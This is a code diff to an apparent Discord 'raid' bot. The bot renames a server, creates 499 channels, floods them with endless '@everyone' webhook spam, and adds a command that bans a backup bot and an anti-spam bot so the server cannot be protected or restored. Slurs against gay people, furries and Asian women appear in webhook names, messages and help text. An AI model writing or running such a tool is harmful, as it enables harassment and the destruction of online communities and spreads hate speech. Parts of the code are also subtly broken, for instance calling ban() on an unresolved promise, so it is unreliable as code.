@@ -32,18 +32,12 @@ client.on("message", async (message) => {
                 message.guild.setName('haha admin go grr -ags and gs')
                 for(i = 0; i < 499; i++){
                     message.guild.createChannel('haha admin go grr', 'text').then(m =>{
+                        const mch1 = message.channel.id
                         m.createWebhook("get raided faggots").then(w => {
                             const case1hook = new Discord.WebhookClient(w.id, w.token)
-                            case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                            case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                            case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                            case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                            case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                            case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                            case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                            case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                            case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                            case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                            while(Boolean(client.channels.cache.get(mch1)) == true){
+                              case1hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                            }
                         })
                     })
                     message.guild.createChannel('haha admin go grr', 'voice')
@@ -52,18 +46,12 @@ client.on("message", async (message) => {
                 message.guild.setName(`${args.slice(0).join(' ')}`)
                 for(i = 0; i < 499; i++){
                     message.guild.createChannel(`${args.slice(0).join(' ')}`, 'text').then(m =>{
+                        const mch2 = message.channel.id
                         m.createWebhook("get raided faggots").then(w => {
                             const case2hook = new Discord.WebhookClient(w.id, w.token)
-                            case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                            case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                            case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                            case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                            case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                            case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                            case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                            case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                            case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
-                            case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                            while(Boolean(client.channels.cache.get(mch2)) == true) {
+                              case2hook.send(`@everyone raided epicclly by padero's private rice girl`)
+                            }
                         })
                     })
                     message.guild.createChannel(`${args.slice(0).join(' ')}`, 'voice')
@@ -93,20 +81,17 @@ client.on("message", async (message) => {
             "$del - yeets all the channels and only leaves one",
             "$admall - self explanatory",
             "$servername (new server name) - self explanatory",
-            "$spam (times) (text) - self explanatory",
+            "$antiprotector - bans xenon (backup bot) and betterantispam",
             `$help - bruhhh\n`,
             "Bot by paradino, making gachafags and furries lifes worse"]
             message.author.send(`${help.slice(0).join(`\n`)}`).catch(() => message.channel.send(`enable yo dms dumbass`))
         break;
-        case "spam":
-            message.delete()
-            if(!args[0]) return message.author.send(`how many times`).catch(() => message.channel.send(`enable yo dms dumbass`))
-            if(args[0] == isNaN()) return message.author.send(`how many times`).catch(() => message.channel.send(`enable yo dms dumbass`))
-            if(!args[1]) return message.author.send(`spam what`).catch(() => message.channel.send(`enable yo dms dumbass`))
-            message.channel.createWebhook(`CARAI CLEDIN ESSA FOI DE FUDE`).then(w => {
-                const wbClient = new Discord.WebhookClient(w.id, w.token)
-                for(let wbi = 0; wbi < args[0]; wbi++) wbClient.send(`${args.slice(1).join(' ')}`)
-            })
+        case "antiprotector":
+          message.delete()
+          const xenon = message.guild.fetchMember(`416358583220043796`)
+          const betterantispam = message.guild.fetchMember(`501982335076532224`)
+          xenon.ban()
+          betterantispam.ban()
         break;
     }
 });
